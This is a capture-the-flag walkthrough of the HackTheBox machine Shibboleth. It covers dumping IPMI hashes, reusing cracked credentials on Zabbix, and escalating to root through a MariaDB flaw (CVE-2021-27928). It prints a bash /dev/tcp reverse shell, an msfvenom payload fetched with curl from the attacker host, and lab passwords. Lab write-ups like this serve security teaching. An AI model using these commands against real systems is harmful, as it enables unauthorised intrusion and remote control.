# HTB - Shibboleth Walkthrough 🥷

> _“Don’t half-ass it. When you stop midway, you lose your momentum and make dumb mistakes.”_



### 🔍 Initial Recon

#### 🔎 TCP Scan

Only one port stood tall:

```
80/tcp open  http    syn-ack Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://shibboleth.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: shibboleth.htb
```

So it’s likely a web-based entry point — either a web shell, RCE, or hopefully SSH later on (I like having a stable shell, sue me).

🔎 UDP Scan

```
623/udp open  asf-rmcp
```

Yup. That’s IPMI. A classic hole in many networks. Tucking that away for later…

### 🌐 Subdomain Discovery

```
ffuf -u http://shibboleth.htb -H 'Host: FUZZ.shibboleth.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 18
```

Found:

```
monitor
monitoring
zabbix
```

All routed to the same interface/site. Interesting. Burp showed some app behavior, but nothing juicy yet.

### 🔁 Circle Back to UDP (623/IPMI)

Ref: [HackTricks on IPMI](https://hacktricks.boitatech.com.br/pentesting/623-udp-ipmi)

Used Metasploit to pull potential hashes:

```
msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts 10.10.11.124
run
```

💥 Got a juicy hash:

```
Administrator:914fade8820100000830a3be05dcbec9310a8c18dfb7589f1e3de87662a5ca64ee24ff833aa0e9a1a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:bda78a132c0e95bc35fd085fbb136ac6dc62c762
```

Saved it and cracked it:

```
echo "<hash>" > hash
hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt
```

### 🔐 Zabbix Login

Tried creds on Zabbix from subdomain — and it worked.



***

### 🖥️ Reverse Shell via Zabbix

To execute a reverse shell, used Zabbix's `system.run[]` item:

```
echo "bash -i >& /dev/tcp/10.10.16.8/4444 0>&1" | base64
```

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

⚠️ _Without `nowait`, the session died in \~4 seconds. Annoying little gotcha._

Made the shell stable with:

```
script /dev/null -c bash
```

### 🔄 Priv Esc - Switching Users

Poked around. Found a second user: `ipmi-svc`. Tried the same password. It worked.

```
su ipmi-svc
# Password: ilovepumkinpie1

```

### 🧪 Enumeration & Dead Ends

* Checked `/etc/zabbix/zabbix_server.conf` for DB creds.
* Looked at sudo perms.
* Dug through config files.
* Nada. No root path in sight.\
  &#xNAN;_(Paused here because guests showed up. Came back later.)_



### 🤯 Moment of Clarity: MariaDB Version Exploit (CVE-2021-27928)

Should’ve thought of this sooner. It’s literally part of what I do at work — check SBOMs and versions.

Saw MySQL version was **10.3.25** → vulnerable.

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.8 LPORT=4445 -f elf-so -o rev.so    
```

```
nc -lvnp 4445
```



```
curl http://10.10.16.8/rev.so --output rev.so
```



```
mysql -u zabbix -pbloooarskybluh
```

Then triggered:

```
SET GLOBAL wsrep_provider="/home/ipmi-svc/rev.so";
```

* and you get a shell as root

🔥 **ROOT SHELL DROPPED.**

### 🧠 Lessons Learned

* Don’t half-ass walkthroughs — finish what you start. Pausing mid-box kills flow and costs you time.
* IPMI still sucks.
* Zabbix + misconfigs = pwnage.





